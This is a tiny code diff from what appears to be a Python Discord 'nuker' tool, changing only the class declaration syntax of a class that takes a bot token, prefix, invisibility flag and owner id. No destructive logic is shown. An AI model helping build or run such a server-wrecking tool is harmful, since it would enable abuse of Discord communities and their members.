@@ -1,6 +1,6 @@
 import discord, requests, random, string, asyncio, threading, json, time
 
-class nuker():
+class nuker:
     def __init__(self, token, prefix="!", invis=True, ownerid=None, assignCmd=True):
         self.token = token
         self.prefix = prefix
